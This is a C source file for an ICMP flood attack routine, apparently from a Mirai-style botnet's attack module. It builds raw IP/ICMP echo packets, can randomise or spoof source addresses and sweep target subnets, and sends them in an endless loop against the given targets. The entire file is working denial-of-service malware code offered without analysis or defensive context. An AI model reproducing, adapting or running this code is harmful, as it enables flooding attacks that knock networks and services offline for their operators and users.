#define _GNU_SOURCE

#include <sys/socket.h>
#include <linux/ip.h>
#include <linux/icmp.h>
#include <time.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <stdlib.h>

#include "headers/includes.h"
#include "headers/attack.h"
#include "headers/rand.h"
#include "headers/checksum.h"

void attack_icmpflood(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, fd;
    char **pkts = calloc(targs_len, sizeof(char *));
    uint16_t ip_ident = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_IDENT, 0xFFFF);
    uint8_t ip_ttl = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TTL, 255);
    uint8_t ip_tos = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_TOS, 0);
    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, FALSE);
    uint32_t source_ip = attack_get_opt_ip(opts_len, opts, ATK_OPT_SOURCE, LOCAL_ADDR);
    int payload_size = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 56);

    if (payload_size > 65500) payload_size = 65500;
    if (payload_size < 0) payload_size = 0;

    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0)
        return;

    int hincl = 1;
    setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));

    for (i = 0; i < targs_len; i++)
    {
        pkts[i] = calloc(1, sizeof(struct iphdr) + sizeof(struct icmphdr) + payload_size);
        struct iphdr *iph = (struct iphdr *)pkts[i];
        struct icmphdr *icmph = (struct icmphdr *)(iph + 1);
        char *payload = (char *)(icmph + 1);

        iph->version = 4;
        iph->ihl = 5;
        iph->tos = ip_tos;
        iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct icmphdr) + payload_size);
        iph->id = htons(ip_ident);
        iph->frag_off = dont_frag ? htons(0x4000) : 0;
        iph->ttl = ip_ttl;
        iph->protocol = IPPROTO_ICMP;
        iph->saddr = source_ip;
        iph->daddr = targs[i].addr;

        icmph->type = ICMP_ECHO;
        icmph->code = 0;
        icmph->un.echo.id = htons(rand_next() & 0xFFFF);
        icmph->un.echo.sequence = htons(rand_next() & 0xFFFF);
        icmph->checksum = 0;

        if (payload_size > 0)
            rand_str(payload, payload_size);
    }

    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            struct iphdr *iph = (struct iphdr *)pkts[i];
            struct icmphdr *icmph = (struct icmphdr *)(iph + 1);

            if (targs[i].netmask < 32)
                iph->daddr = htonl(ntohl(targs[i].addr) + (rand_next() % (1 << (32 - targs[i].netmask))));

            if (source_ip == 0xFFFFFFFF)
                iph->saddr = rand_next();

            if (ip_ident == 0xFFFF)
                iph->id = htons(rand_next() & 0xFFFF);

            icmph->un.echo.sequence = htons(rand_next() & 0xFFFF);

            iph->check = 0;
            iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));

            icmph->checksum = 0;
            icmph->checksum = checksum_generic((uint16_t *)icmph, sizeof(struct icmphdr) + payload_size);

            sendto(fd, pkts[i], sizeof(struct iphdr) + sizeof(struct icmphdr) + payload_size, 0, (struct sockaddr *)&targs[i].sock_addr, sizeof(struct sockaddr_in)
            );
        }
    }

    close(fd);
    for (i = 0; i < targs_len; i++)
        free(pkts[i]);
    free(pkts);
}
